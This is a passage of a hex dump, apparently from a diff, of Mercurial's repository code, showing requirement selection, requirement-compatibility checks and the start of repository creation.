-00021860: 6571 7569 7265 6d65 6e74 736d 6f64 2e4e  equirementsmod.N
-00021870: 4f44 454d 4150 5f52 4551 5549 5245 4d45  ODEMAP_REQUIREME
-00021880: 4e54 290a 0a20 2020 2023 2069 6620 7368  NT)..    # if sh
-00021890: 6172 652d 7361 6665 2069 7320 656e 6162  are-safe is enab
-000218a0: 6c65 642c 206c 6574 2773 2063 7265 6174  led, let's creat
-000218b0: 6520 7468 6520 6e65 7720 7265 706f 7369  e the new reposi
-000218c0: 746f 7279 2077 6974 6820 7468 6520 6e65  tory with the ne
-000218d0: 770a 2020 2020 2320 7265 7175 6972 656d  w.    # requirem
-000218e0: 656e 740a 2020 2020 6966 2075 692e 636f  ent.    if ui.co
-000218f0: 6e66 6967 626f 6f6c 2862 2766 6f72 6d61  nfigbool(b'forma
-00021900: 7427 2c20 6227 7573 652d 7368 6172 652d  t', b'use-share-
-00021910: 7361 6665 2729 3a0a 2020 2020 2020 2020  safe'):.        
-00021920: 7265 7175 6972 656d 656e 7473 2e61 6464  requirements.add
-00021930: 2872 6571 7569 7265 6d65 6e74 736d 6f64  (requirementsmod
-00021940: 2e53 4841 5245 5341 4645 5f52 4551 5549  .SHARESAFE_REQUI
-00021950: 5245 4d45 4e54 290a 0a20 2020 2023 2069  REMENT)..    # i
-00021960: 6620 7765 2061 7265 2063 7265 6174 696e  f we are creatin
-00021970: 6720 6120 7368 6172 652d 7265 706f c2b9  g a share-repo..
-00021980: 2020 7765 2068 6176 6520 746f 2068 616e    we have to han
-00021990: 646c 6520 7265 7175 6972 656d 656e 740a  dle requirement.
-000219a0: 2020 2020 2320 6469 6666 6572 656e 746c      # differentl
-000219b0: 792e 0a20 2020 2023 0a20 2020 2023 205b  y..    #.    # [
-000219c0: 315d 2028 692e 652e 2072 6575 7369 6e67  1] (i.e. reusing
-000219d0: 2074 6865 2073 746f 7265 2066 726f 6d20   the store from 
-000219e0: 616e 6f74 6865 7220 7265 706f 7369 746f  another reposito
-000219f0: 7279 2c20 6a75 7374 2068 6176 696e 6720  ry, just having 
-00021a00: 610a 2020 2020 2320 776f 726b 696e 6720  a.    # working 
-00021a10: 636f 7079 290a 2020 2020 6966 2062 2773  copy).    if b's
-00021a20: 6861 7265 6472 6570 6f27 2069 6e20 6372  haredrepo' in cr
-00021a30: 6561 7465 6f70 7473 3a0a 2020 2020 2020  eateopts:.      
-00021a40: 2020 736f 7572 6365 5f72 6571 7569 7265    source_require
-00021a50: 6d65 6e74 7320 3d20 7365 7428 6372 6561  ments = set(crea
-00021a60: 7465 6f70 7473 5b62 2773 6861 7265 6472  teopts[b'sharedr
-00021a70: 6570 6f27 5d2e 7265 7175 6972 656d 656e  epo'].requiremen
-00021a80: 7473 290a 0a20 2020 2020 2020 2069 6620  ts)..        if 
-00021a90: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
-00021aa0: 5348 4152 4553 4146 455f 5245 5155 4952  SHARESAFE_REQUIR
-00021ab0: 454d 454e 5420 6e6f 7420 696e 2073 6f75  EMENT not in sou
-00021ac0: 7263 655f 7265 7175 6972 656d 656e 7473  rce_requirements
-00021ad0: 3a0a 2020 2020 2020 2020 2020 2020 2320  :.            # 
-00021ae0: 7368 6172 6520 746f 2061 6e20 6f6c 6420  share to an old 
-00021af0: 7363 686f 6f6c 2072 6570 6f73 6974 6f72  school repositor
-00021b00: 792c 2077 6520 6861 7665 2074 6f20 636f  y, we have to co
-00021b10: 7079 2074 6865 0a20 2020 2020 2020 2020  py the.         
-00021b20: 2020 2023 2072 6571 7569 7265 6d65 6e74     # requirement
-00021b30: 7320 616e 6420 686f 7065 2066 6f72 2074  s and hope for t
-00021b40: 6865 2062 6573 742e 0a20 2020 2020 2020  he best..       
-00021b50: 2020 2020 2072 6571 7569 7265 6d65 6e74       requirement
-00021b60: 7320 3d20 736f 7572 6365 5f72 6571 7569  s = source_requi
-00021b70: 7265 6d65 6e74 730a 2020 2020 2020 2020  rements.        
-00021b80: 656c 7365 3a0a 2020 2020 2020 2020 2020  else:.          
-00021b90: 2020 2320 5765 2068 6176 6520 636f 6e74    # We have cont
-00021ba0: 726f 6c20 6f6e 2074 6865 2077 6f72 6b69  rol on the worki
-00021bb0: 6e67 2063 6f70 7920 6f6e 6c79 2c20 736f  ng copy only, so
-00021bc0: 2022 636f 7079 2220 7468 6520 6e6f 6e0a   "copy" the non.
-00021bd0: 2020 2020 2020 2020 2020 2020 2320 776f              # wo
-00021be0: 726b 696e 6720 636f 7079 2070 6172 7420  rking copy part 
-00021bf0: 6f76 6572 2c20 6967 6e6f 7269 6e67 2070  over, ignoring p
-00021c00: 7265 7669 6f75 7320 6c6f 6769 632e 0a20  revious logic.. 
-00021c10: 2020 2020 2020 2020 2020 2074 6f5f 6472             to_dr
-00021c20: 6f70 203d 2073 6574 2829 0a20 2020 2020  op = set().     
-00021c30: 2020 2020 2020 2066 6f72 2072 6571 2069         for req i
-00021c40: 6e20 7265 7175 6972 656d 656e 7473 3a0a  n requirements:.
-00021c50: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00021c60: 6966 2072 6571 2069 6e20 7265 7175 6972  if req in requir
-00021c70: 656d 656e 7473 6d6f 642e 574f 524b 494e  ementsmod.WORKIN
-00021c80: 475f 4449 525f 5245 5155 4952 454d 454e  G_DIR_REQUIREMEN
-00021c90: 5453 3a0a 2020 2020 2020 2020 2020 2020  TS:.            
-00021ca0: 2020 2020 2020 2020 636f 6e74 696e 7565          continue
-00021cb0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00021cc0: 2069 6620 7265 7120 696e 2073 6f75 7263   if req in sourc
-00021cd0: 655f 7265 7175 6972 656d 656e 7473 3a0a  e_requirements:.
-00021ce0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00021cf0: 2020 2020 636f 6e74 696e 7565 0a20 2020      continue.   
-00021d00: 2020 2020 2020 2020 2020 2020 2074 6f5f               to_
-00021d10: 6472 6f70 2e61 6464 2872 6571 290a 2020  drop.add(req).  
-00021d20: 2020 2020 2020 2020 2020 7265 7175 6972            requir
-00021d30: 656d 656e 7473 202d 3d20 746f 5f64 726f  ements -= to_dro
-00021d40: 700a 2020 2020 2020 2020 2020 2020 7265  p.            re
-00021d50: 7175 6972 656d 656e 7473 207c 3d20 736f  quirements |= so
-00021d60: 7572 6365 5f72 6571 7569 7265 6d65 6e74  urce_requirement
-00021d70: 730a 0a20 2020 2020 2020 2069 6620 6372  s..        if cr
-00021d80: 6561 7465 6f70 7473 2e67 6574 2862 2773  eateopts.get(b's
-00021d90: 6861 7265 6472 656c 6174 6976 6527 293a  haredrelative'):
-00021da0: 0a20 2020 2020 2020 2020 2020 2072 6571  .            req
-00021db0: 7569 7265 6d65 6e74 732e 6164 6428 7265  uirements.add(re
-00021dc0: 7175 6972 656d 656e 7473 6d6f 642e 5245  quirementsmod.RE
-00021dd0: 4c41 5449 5645 5f53 4841 5245 445f 5245  LATIVE_SHARED_RE
-00021de0: 5155 4952 454d 454e 5429 0a20 2020 2020  QUIREMENT).     
-00021df0: 2020 2065 6c73 653a 0a20 2020 2020 2020     else:.       
-00021e00: 2020 2020 2072 6571 7569 7265 6d65 6e74       requirement
-00021e10: 732e 6164 6428 7265 7175 6972 656d 656e  s.add(requiremen
-00021e20: 7473 6d6f 642e 5348 4152 4544 5f52 4551  tsmod.SHARED_REQ
-00021e30: 5549 5245 4d45 4e54 290a 0a20 2020 2069  UIREMENT)..    i
-00021e40: 6620 7569 2e63 6f6e 6669 6762 6f6f 6c28  f ui.configbool(
-00021e50: 6227 666f 726d 6174 272c 2062 2775 7365  b'format', b'use
-00021e60: 2d64 6972 7374 6174 652d 7472 6163 6b65  -dirstate-tracke
-00021e70: 642d 6869 6e74 2729 3a0a 2020 2020 2020  d-hint'):.      
-00021e80: 2020 7665 7273 696f 6e20 3d20 7569 2e63    version = ui.c
-00021e90: 6f6e 6669 6769 6e74 2862 2766 6f72 6d61  onfigint(b'forma
-00021ea0: 7427 2c20 6227 7573 652d 6469 7273 7461  t', b'use-dirsta
-00021eb0: 7465 2d74 7261 636b 6564 2d68 696e 742e  te-tracked-hint.
-00021ec0: 7665 7273 696f 6e27 290a 2020 2020 2020  version').      
-00021ed0: 2020 6d73 6720 3d20 5f28 6222 6967 6e6f    msg = _(b"igno
-00021ee0: 7269 6e67 2075 6e6b 6e6f 776e 2074 7261  ring unknown tra
-00021ef0: 636b 6564 206b 6579 2076 6572 7369 6f6e  cked key version
-00021f00: 3a20 2564 5c6e 2229 0a20 2020 2020 2020  : %d\n").       
-00021f10: 2068 696e 7420 3d20 5f28 0a20 2020 2020   hint = _(.     
-00021f20: 2020 2020 2020 2062 2273 6565 2060 6867         b"see `hg
-00021f30: 2068 656c 7020 636f 6e66 6967 2e66 6f72   help config.for
-00021f40: 6d61 742e 7573 652d 6469 7273 7461 7465  mat.use-dirstate
-00021f50: 2d74 7261 636b 6564 2d68 696e 742d 7665  -tracked-hint-ve
-00021f60: 7273 696f 6e22 0a20 2020 2020 2020 2029  rsion".        )
-00021f70: 0a20 2020 2020 2020 2069 6620 7665 7273  .        if vers
-00021f80: 696f 6e20 213d 2031 3a0a 2020 2020 2020  ion != 1:.      
-00021f90: 2020 2020 2020 7569 2e77 6172 6e28 6d73        ui.warn(ms
-00021fa0: 6720 2520 7665 7273 696f 6e2c 2068 696e  g % version, hin
-00021fb0: 743d 6869 6e74 290a 2020 2020 2020 2020  t=hint).        
-00021fc0: 656c 7365 3a0a 2020 2020 2020 2020 2020  else:.          
-00021fd0: 2020 7265 7175 6972 656d 656e 7473 2e61    requirements.a
-00021fe0: 6464 2872 6571 7569 7265 6d65 6e74 736d  dd(requirementsm
-00021ff0: 6f64 2e44 4952 5354 4154 455f 5452 4143  od.DIRSTATE_TRAC
-00022000: 4b45 445f 4849 4e54 5f56 3129 0a0a 2020  KED_HINT_V1)..  
-00022010: 2020 7265 7475 726e 2072 6571 7569 7265    return require
-00022020: 6d65 6e74 730a 0a0a 6465 6620 6368 6563  ments...def chec
-00022030: 6b72 6571 7569 7265 6d65 6e74 7363 6f6d  krequirementscom
-00022040: 7061 7428 7569 2c20 7265 7175 6972 656d  pat(ui, requirem
-00022050: 656e 7473 293a 0a20 2020 2022 2222 4368  ents):.    """Ch
-00022060: 6563 6b73 2063 6f6d 7061 7469 6269 6c69  ecks compatibili
-00022070: 7479 206f 6620 7265 706f 7369 746f 7279  ty of repository
-00022080: 2072 6571 7569 7265 6d65 6e74 7320 656e   requirements en
-00022090: 6162 6c65 6420 616e 6420 6469 7361 626c  abled and disabl
-000220a0: 6564 2e0a 0a20 2020 2052 6574 7572 6e73  ed...    Returns
-000220b0: 2061 2073 6574 206f 6620 7265 7175 6972   a set of requir
-000220c0: 656d 656e 7473 2077 6869 6368 206e 6565  ements which nee
-000220d0: 6473 2074 6f20 6265 2064 726f 7070 6564  ds to be dropped
-000220e0: 2062 6563 6175 7365 2064 6570 656e 6465   because depende
-000220f0: 6e64 0a20 2020 2072 6571 7569 7265 6d65  nd.    requireme
-00022100: 6e74 7320 6172 6520 6e6f 7420 656e 6162  nts are not enab
-00022110: 6c65 642e 2041 6c73 6f20 7761 726e 7320  led. Also warns 
-00022120: 7573 6572 7320 6162 6f75 7420 6974 2222  users about it""
-00022130: 220a 0a20 2020 2064 726f 7070 6564 203d  "..    dropped =
-00022140: 2073 6574 2829 0a0a 2020 2020 6966 2072   set()..    if r
-00022150: 6571 7569 7265 6d65 6e74 736d 6f64 2e53  equirementsmod.S
-00022160: 544f 5245 5f52 4551 5549 5245 4d45 4e54  TORE_REQUIREMENT
-00022170: 206e 6f74 2069 6e20 7265 7175 6972 656d   not in requirem
-00022180: 656e 7473 3a0a 2020 2020 2020 2020 6966  ents:.        if
-00022190: 2072 6571 7569 7265 6d65 6e74 736d 6f64   requirementsmod
-000221a0: 2e42 4f4f 4b4d 4152 4b53 5f49 4e5f 5354  .BOOKMARKS_IN_ST
-000221b0: 4f52 455f 5245 5155 4952 454d 454e 5420  ORE_REQUIREMENT 
-000221c0: 696e 2072 6571 7569 7265 6d65 6e74 733a  in requirements:
-000221d0: 0a20 2020 2020 2020 2020 2020 2075 692e  .            ui.
-000221e0: 7761 726e 280a 2020 2020 2020 2020 2020  warn(.          
-000221f0: 2020 2020 2020 5f28 0a20 2020 2020 2020        _(.       
-00022200: 2020 2020 2020 2020 2020 2020 2062 2769               b'i
-00022210: 676e 6f72 696e 6720 656e 6162 6c65 6420  gnoring enabled 
-00022220: 5c27 666f 726d 6174 2e62 6f6f 6b6d 6172  \'format.bookmar
-00022230: 6b73 2d69 6e2d 7374 6f72 655c 2720 636f  ks-in-store\' co
-00022240: 6e66 6967 2027 0a20 2020 2020 2020 2020  nfig '.         
-00022250: 2020 2020 2020 2020 2020 2062 2762 6561             b'bea
-00022260: 6375 7365 2069 7420 6973 2069 6e63 6f6d  cuse it is incom
-00022270: 7061 7469 626c 6520 7769 7468 2064 6973  patible with dis
-00022280: 6162 6c65 6420 270a 2020 2020 2020 2020  abled '.        
-00022290: 2020 2020 2020 2020 2020 2020 6227 5c27              b'\'
-000222a0: 666f 726d 6174 2e75 7365 7374 6f72 655c  format.usestore\
-000222b0: 2720 636f 6e66 6967 5c6e 270a 2020 2020  ' config\n'.    
-000222c0: 2020 2020 2020 2020 2020 2020 290a 2020              ).  
-000222d0: 2020 2020 2020 2020 2020 290a 2020 2020            ).    
-000222e0: 2020 2020 2020 2020 6472 6f70 7065 642e          dropped.
-000222f0: 6164 6428 7265 7175 6972 656d 656e 7473  add(requirements
-00022300: 6d6f 642e 424f 4f4b 4d41 524b 535f 494e  mod.BOOKMARKS_IN
-00022310: 5f53 544f 5245 5f52 4551 5549 5245 4d45  _STORE_REQUIREME
-00022320: 4e54 290a 0a20 2020 2020 2020 2069 6620  NT)..        if 
-00022330: 280a 2020 2020 2020 2020 2020 2020 7265  (.            re
-00022340: 7175 6972 656d 656e 7473 6d6f 642e 5348  quirementsmod.SH
-00022350: 4152 4544 5f52 4551 5549 5245 4d45 4e54  ARED_REQUIREMENT
-00022360: 2069 6e20 7265 7175 6972 656d 656e 7473   in requirements
-00022370: 0a20 2020 2020 2020 2020 2020 206f 7220  .            or 
-00022380: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
-00022390: 5245 4c41 5449 5645 5f53 4841 5245 445f  RELATIVE_SHARED_
-000223a0: 5245 5155 4952 454d 454e 5420 696e 2072  REQUIREMENT in r
-000223b0: 6571 7569 7265 6d65 6e74 730a 2020 2020  equirements.    
-000223c0: 2020 2020 293a 0a20 2020 2020 2020 2020      ):.         
-000223d0: 2020 2072 6169 7365 2065 7272 6f72 2e41     raise error.A
-000223e0: 626f 7274 280a 2020 2020 2020 2020 2020  bort(.          
-000223f0: 2020 2020 2020 5f28 0a20 2020 2020 2020        _(.       
-00022400: 2020 2020 2020 2020 2020 2020 2062 2263               b"c
-00022410: 616e 6e6f 7420 6372 6561 7465 2073 6861  annot create sha
-00022420: 7265 6420 7265 706f 7369 746f 7279 2061  red repository a
-00022430: 7320 736f 7572 6365 2077 6173 2063 7265  s source was cre
-00022440: 6174 6564 220a 2020 2020 2020 2020 2020  ated".          
-00022450: 2020 2020 2020 2020 2020 6222 2077 6974            b" wit
-00022460: 6820 2766 6f72 6d61 742e 7573 6573 746f  h 'format.usesto
-00022470: 7265 2720 636f 6e66 6967 2064 6973 6162  re' config disab
-00022480: 6c65 6422 0a20 2020 2020 2020 2020 2020  led".           
-00022490: 2020 2020 2029 0a20 2020 2020 2020 2020       ).         
-000224a0: 2020 2029 0a0a 2020 2020 2020 2020 6966     )..        if
-000224b0: 2072 6571 7569 7265 6d65 6e74 736d 6f64   requirementsmod
-000224c0: 2e53 4841 5245 5341 4645 5f52 4551 5549  .SHARESAFE_REQUI
-000224d0: 5245 4d45 4e54 2069 6e20 7265 7175 6972  REMENT in requir
-000224e0: 656d 656e 7473 3a0a 2020 2020 2020 2020  ements:.        
-000224f0: 2020 2020 6966 2075 692e 6861 7363 6f6e      if ui.hascon
-00022500: 6669 6728 6227 666f 726d 6174 272c 2062  fig(b'format', b
-00022510: 2775 7365 2d73 6861 7265 2d73 6166 6527  'use-share-safe'
-00022520: 293a 0a20 2020 2020 2020 2020 2020 2020  ):.             
-00022530: 2020 206d 7367 203d 205f 280a 2020 2020     msg = _(.    
-00022540: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00022550: 6222 6967 6e6f 7269 6e67 2065 6e61 626c  b"ignoring enabl
-00022560: 6564 2027 666f 726d 6174 2e75 7365 2d73  ed 'format.use-s
-00022570: 6861 7265 2d73 6166 6527 2063 6f6e 6669  hare-safe' confi
-00022580: 6720 6265 6361 7573 6520 220a 2020 2020  g because ".    
-00022590: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000225a0: 6222 6974 2069 7320 696e 636f 6d70 6174  b"it is incompat
-000225b0: 6962 6c65 2077 6974 6820 6469 7361 626c  ible with disabl
-000225c0: 6564 2027 666f 726d 6174 2e75 7365 7374  ed 'format.usest
-000225d0: 6f72 6527 220a 2020 2020 2020 2020 2020  ore'".          
-000225e0: 2020 2020 2020 2020 2020 6222 2063 6f6e            b" con
-000225f0: 6669 675c 6e22 0a20 2020 2020 2020 2020  fig\n".         
-00022600: 2020 2020 2020 2029 0a20 2020 2020 2020         ).       
-00022610: 2020 2020 2020 2020 2075 692e 7761 726e           ui.warn
-00022620: 286d 7367 290a 2020 2020 2020 2020 2020  (msg).          
-00022630: 2020 6472 6f70 7065 642e 6164 6428 7265    dropped.add(re
-00022640: 7175 6972 656d 656e 7473 6d6f 642e 5348  quirementsmod.SH
-00022650: 4152 4553 4146 455f 5245 5155 4952 454d  ARESAFE_REQUIREM
-00022660: 454e 5429 0a0a 2020 2020 7265 7475 726e  ENT)..    return
-00022670: 2064 726f 7070 6564 0a0a 0a64 6566 2066   dropped...def f
-00022680: 696c 7465 726b 6e6f 776e 6372 6561 7465  ilterknowncreate
-00022690: 6f70 7473 2875 692c 2063 7265 6174 656f  opts(ui, createo
-000226a0: 7074 7329 3a0a 2020 2020 2222 2246 696c  pts):.    """Fil
-000226b0: 7465 7273 2061 2064 6963 7420 6f66 2072  ters a dict of r
-000226c0: 6570 6f20 6372 6561 7469 6f6e 206f 7074  epo creation opt
-000226d0: 696f 6e73 2061 6761 696e 7374 206f 7074  ions against opt
-000226e0: 696f 6e73 2074 6861 7420 6172 6520 6b6e  ions that are kn
-000226f0: 6f77 6e2e 0a0a 2020 2020 5265 6365 6976  own...    Receiv
-00022700: 6573 2061 2064 6963 7420 6f66 2072 6570  es a dict of rep
-00022710: 6f20 6372 6561 7469 6f6e 206f 7074 696f  o creation optio
-00022720: 6e73 2061 6e64 2072 6574 7572 6e73 2061  ns and returns a
-00022730: 2064 6963 7420 6f66 2074 686f 7365 0a20   dict of those. 
-00022740: 2020 206f 7074 696f 6e73 2074 6861 7420     options that 
-00022750: 7765 2064 6f6e 2774 206b 6e6f 7720 686f  we don't know ho
-00022760: 7720 746f 2068 616e 646c 652e 0a0a 2020  w to handle...  
-00022770: 2020 5468 6973 2066 756e 6374 696f 6e20    This function 
-00022780: 6973 2063 616c 6c65 6420 6173 2070 6172  is called as par
-00022790: 7420 6f66 2072 6570 6f73 6974 6f72 7920  t of repository 
-000227a0: 6372 6561 7469 6f6e 2e20 4966 2074 6865  creation. If the
-000227b0: 0a20 2020 2072 6574 7572 6e65 6420 6469  .    returned di
-000227c0: 6374 2063 6f6e 7461 696e 7320 616e 7920  ct contains any 
-000227d0: 6974 656d 732c 2072 6570 6f73 6974 6f72  items, repositor
-000227e0: 7920 6372 6561 7469 6f6e 2077 696c 6c20  y creation will 
-000227f0: 6e6f 740a 2020 2020 6265 2061 6c6c 6f77  not.    be allow
-00022800: 6564 2c20 6173 2069 7420 6d65 616e 7320  ed, as it means 
-00022810: 7468 6572 6520 7761 7320 6120 7265 7175  there was a requ
-00022820: 6573 7420 746f 2063 7265 6174 6520 6120  est to create a 
-00022830: 7265 706f 7369 746f 7279 0a20 2020 2077  repository.    w
-00022840: 6974 6820 6f70 7469 6f6e 7320 6e6f 7420  ith options not 
-00022850: 7265 636f 676e 697a 6564 2062 7920 6c6f  recognized by lo
-00022860: 6164 6564 2063 6f64 652e 0a0a 2020 2020  aded code...    
-00022870: 4578 7465 6e73 696f 6e73 2063 616e 2077  Extensions can w
-00022880: 7261 7020 7468 6973 2066 756e 6374 696f  rap this functio
-00022890: 6e20 746f 2066 696c 7465 7220 6f75 7420  n to filter out 
-000228a0: 6372 6561 7469 6f6e 206f 7074 696f 6e73  creation options
-000228b0: 0a20 2020 2074 6865 7920 6b6e 6f77 2068  .    they know h
-000228c0: 6f77 2074 6f20 6861 6e64 6c65 2e0a 2020  ow to handle..  
-000228d0: 2020 2222 220a 2020 2020 6b6e 6f77 6e20    """.    known 
-000228e0: 3d20 7b0a 2020 2020 2020 2020 6227 6261  = {.        b'ba
-000228f0: 636b 656e 6427 2c0a 2020 2020 2020 2020  ckend',.        
-00022900: 6227 6c66 7327 2c0a 2020 2020 2020 2020  b'lfs',.        
-00022910: 6227 6e61 7272 6f77 6669 6c65 7327 2c0a  b'narrowfiles',.
-00022920: 2020 2020 2020 2020 6227 7368 6172 6564          b'shared
-00022930: 7265 706f 272c 0a20 2020 2020 2020 2062  repo',.        b
-00022940: 2773 6861 7265 6472 656c 6174 6976 6527  'sharedrelative'
-00022950: 2c0a 2020 2020 2020 2020 6227 7368 6172  ,.        b'shar
-00022960: 6564 6974 656d 7327 2c0a 2020 2020 2020  editems',.      
-00022970: 2020 6227 7368 616c 6c6f 7766 696c 6573    b'shallowfiles
-00022980: 746f 7265 272c 0a20 2020 207d 0a0a 2020  tore',.    }..  
-00022990: 2020 7265 7475 726e 207b 6b3a 2076 2066    return {k: v f
-000229a0: 6f72 206b 2c20 7620 696e 2063 7265 6174  or k, v in creat
-000229b0: 656f 7074 732e 6974 656d 7328 2920 6966  eopts.items() if
-000229c0: 206b 206e 6f74 2069 6e20 6b6e 6f77 6e7d   k not in known}
-000229d0: 0a0a 0a64 6566 2063 7265 6174 6572 6570  ...def createrep
-000229e0: 6f73 6974 6f72 7928 7569 2c20 7061 7468  ository(ui, path
-000229f0: 3a20 6279 7465 732c 2063 7265 6174 656f  : bytes, createo
-00022a00: 7074 733d 4e6f 6e65 2c20 7265 7175 6972  pts=None, requir
-00022a10: 656d 656e 7473 3d4e 6f6e 6529 3a0a 2020  ements=None):.  
-00022a20: 2020 2222 2243 7265 6174 6520 6120 6e65    """Create a ne
-00022a30: 7720 7265 706f 7369 746f 7279 2069 6e20  w repository in 
-00022a40: 6120 7666 732e 0a0a 2020 2020 6060 7061  a vfs...    ``pa
-00022a50: 7468 6060 2070 6174 6820 746f 2074 6865  th`` path to the
-00022a60: 206e 6577 2072 6570 6f27 7320 776f 726b   new repo's work
-00022a70: 696e 6720 6469 7265 6374 6f72 792e 0a20  ing directory.. 
-00022a80: 2020 2060 6063 7265 6174 656f 7074 7360     ``createopts`
-00022a90: 6020 6f70 7469 6f6e 7320 666f 7220 7468  ` options for th
-00022aa0: 6520 6e65 7720 7265 706f 7369 746f 7279  e new repository
-00022ab0: 2e0a 2020 2020 6060 7265 7175 6972 656d  ..    ``requirem
-00022ac0: 656e 7460 6020 7072 6564 6566 696e 6564  ent`` predefined
-00022ad0: 2073 6574 206f 6620 7265 7175 6972 656d   set of requirem
-00022ae0: 656e 7473 2e0a 2020 2020 2020 2020 2020  ents..          
-00022af0: 2020 2020 2020 2020 2020 2869 6e63 6f6d            (incom
-00022b00: 7061 7469 626c 6520 7769 7468 2060 6063  patible with ``c
-00022b10: 7265 6174 656f 7074 7360 6029 0a0a 2020  reateopts``)..  
-00022b20: 2020 5468 6520 666f 6c6c 6f77 696e 6720    The following 
-00022b30: 6b65 7973 2066 6f72 2060 6063 7265 6174  keys for ``creat
-00022b40: 656f 7074 7360 6020 6172 6520 7265 636f  eopts`` are reco
-00022b50: 676e 697a 6564 3a0a 0a20 2020 2062 6163  gnized:..    bac
-00022b60: 6b65 6e64 0a20 2020 2020 2020 5468 6520  kend.       The 
-00022b70: 7374 6f72 6167 6520 6261 636b 656e 6420  storage backend 
-00022b80: 746f 2075 7365 2e0a 2020 2020 6c66 730a  to use..    lfs.
-00022b90: 2020 2020 2020 2052 6570 6f73 6974 6f72         Repositor
-00022ba0: 7920 7769 6c6c 2062 6520 6372 6561 7465  y will be create
-00022bb0: 6420 7769 7468 2060 606c 6673 6060 2072  d with ``lfs`` r
-00022bc0: 6571 7569 7265 6d65 6e74 2e20 5468 6520  equirement. The 
-00022bd0: 6c66 7320 6578 7465 6e73 696f 6e0a 2020  lfs extension.  
-00022be0: 2020 2020 2077 696c 6c20 6175 746f 6d61       will automa
-00022bf0: 7469 6361 6c6c 7920 6265 206c 6f61 6465  tically be loade
-00022c00: 6420 7768 656e 2074 6865 2072 6570 6f73  d when the repos
-00022c10: 6974 6f72 7920 6973 2061 6363 6573 7365  itory is accesse
-00022c20: 642e 0a20 2020 206e 6172 726f 7766 696c  d..    narrowfil
-00022c30: 6573 0a20 2020 2020 2020 5365 7420 7570  es.       Set up
-00022c40: 2072 6570 6f73 6974 6f72 7920 746f 2073   repository to s
-00022c50: 7570 706f 7274 206e 6172 726f 7720 6669  upport narrow fi
-00022c60: 6c65 2073 746f 7261 6765 2e0a 2020 2020  le storage..    
-00022c70: 7368 6172 6564 7265 706f 0a20 2020 2020  sharedrepo.     
-00022c80: 2020 5265 706f 7369 746f 7279 206f 626a    Repository obj
-00022c90: 6563 7420 6672 6f6d 2077 6869 6368 2073  ect from which s
-00022ca0: 746f 7261 6765 2073 686f 756c 6420 6265  torage should be
-00022cb0: 2073 6861 7265 642e 0a20 2020 2073 6861   shared..    sha
-00022cc0: 7265 6472 656c 6174 6976 650a 2020 2020  redrelative.    
-00022cd0: 2020 2042 6f6f 6c65 616e 2069 6e64 6963     Boolean indic
-00022ce0: 6174 696e 6720 6966 2074 6865 2070 6174  ating if the pat
-00022cf0: 6820 746f 2074 6865 2073 6861 7265 6420  h to the shared 
-00022d00: 7265 706f 2073 686f 756c 6420 6265 0a20  repo should be. 
-00022d10: 2020 2020 2020 7374 6f72 6564 2061 7320        stored as 
-00022d20: 7265 6c61 7469 7665 2e20 4279 2064 6566  relative. By def
-00022d30: 6175 6c74 2c20 7468 6520 706f 696e 7465  ault, the pointe
-00022d40: 7220 746f 2074 6865 2022 7061 7265 6e74  r to the "parent
-00022d50: 2220 7265 706f 0a20 2020 2020 2020 6973  " repo.       is
-00022d60: 2073 746f 7265 6420 6173 2061 6e20 6162   stored as an ab
-00022d70: 736f 6c75 7465 2070 6174 682e 0a20 2020  solute path..   
-00022d80: 2073 6861 7265 6469 7465 6d73 0a20 2020   shareditems.   
-00022d90: 2020 2020 5365 7420 6f66 2069 7465 6d73      Set of items
-00022da0: 2074 6f20 7368 6172 6520 746f 2074 6865   to share to the
-00022db0: 206e 6577 2072 6570 6f73 6974 6f72 7920   new repository 
-00022dc0: 2869 6e20 6164 6469 7469 6f6e 2074 6f20  (in addition to 
-00022dd0: 7374 6f72 6167 6529 2e0a 2020 2020 7368  storage)..    sh
-00022de0: 616c 6c6f 7766 696c 6573 746f 7265 0a20  allowfilestore. 
-00022df0: 2020 2020 2020 496e 6469 6361 7465 7320        Indicates 
-00022e00: 7468 6174 2073 746f 7261 6765 2066 6f72  that storage for
-00022e10: 2066 696c 6573 2073 686f 756c 6420 6265   files should be
-00022e20: 2073 6861 6c6c 6f77 2028 6e6f 7420 616c   shallow (not al
-00022e30: 6c20 616e 6365 7374 6f72 0a20 2020 2020  l ancestor.     
-00022e40: 2020 7265 7669 7369 6f6e 7320 6172 6520    revisions are 
-00022e50: 6b6e 6f77 6e29 2e0a 2020 2020 2222 220a  known)..    """.
-00022e60: 0a20 2020 2069 6620 7265 7175 6972 656d  .    if requirem
-00022e70: 656e 7473 2069 7320 6e6f 7420 4e6f 6e65  ents is not None
-00022e80: 3a0a 2020 2020 2020 2020 6966 2063 7265  :.        if cre
-00022e90: 6174 656f 7074 7320 6973 206e 6f74 204e  ateopts is not N
-00022ea0: 6f6e 653a 0a20 2020 2020 2020 2020 2020  one:.           
-00022eb0: 206d 7367 203d 2062 2763 616e 6e6f 7420   msg = b'cannot 
-00022ec0: 7370 6563 6966 7920 626f 7468 2063 7265  specify both cre
-00022ed0: 6174 656f 7074 7320 616e 6420 7265 7175  ateopts and requ
-00022ee0: 6972 656d 656e 7473 270a 2020 2020 2020  irements'.      
-00022ef0: 2020 2020 2020 7261 6973 6520 6572 726f        raise erro
-00022f00: 722e 5072 6f67 7261 6d6d 696e 6745 7272  r.ProgrammingErr
-00022f10: 6f72 286d 7367 290a 2020 2020 2020 2020  or(msg).        
-00022f20: 6372 6561 7465 6f70 7473 203d 207b 7d0a  createopts = {}.
-00022f30: 2020 2020 656c 7365 3a0a 2020 2020 2020      else:.      
-00022f40: 2020 6372 6561 7465 6f70 7473 203d 2064    createopts = d
-00022f50: 6566 6175 6c74 6372 6561 7465 6f70 7473  efaultcreateopts
-00022f60: 2875 692c 2063 7265 6174 656f 7074 733d  (ui, createopts=
-00022f70: 6372 6561 7465 6f70 7473 290a 0a20 2020  createopts)..   
-00022f80: 2020 2020 2075 6e6b 6e6f 776e 6f70 7473       unknownopts
-00022f90: 203d 2066 696c 7465 726b 6e6f 776e 6372   = filterknowncr
-00022fa0: 6561 7465 6f70 7473 2875 692c 2063 7265  eateopts(ui, cre
-00022fb0: 6174 656f 7074 7329 0a0a 2020 2020 2020  ateopts)..      
-00022fc0: 2020 6966 206e 6f74 2069 7369 6e73 7461    if not isinsta
